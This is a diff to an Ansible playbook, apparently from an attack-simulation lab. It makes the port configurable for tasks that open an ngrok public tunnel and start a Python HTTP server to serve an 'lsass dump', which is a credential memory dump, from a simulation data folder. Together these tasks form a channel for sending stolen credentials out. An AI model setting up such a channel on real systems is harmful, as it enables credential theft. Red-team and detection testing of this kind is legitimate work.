@@ -5,7 +5,7 @@
 
 - name: Start ngrok http tunnel
   shell: |
-    nohup ngrok http 80 &
+    nohup ngrok http {{ ngrok_port }} &
 
 - name: Wait for ngrok to start
   pause:
@@ -18,7 +18,7 @@
 
 - name: Create HTTP server to serve the lsass dump
   shell: |
-    nohup python3 -m http.server 80 --directory /opt/RBA/attack/simulation/data &
+    nohup python3 -m http.server {{ ngrok_port }} --directory /opt/RBA/attack/simulation/data &
 
 - name: Display the output
   debug:
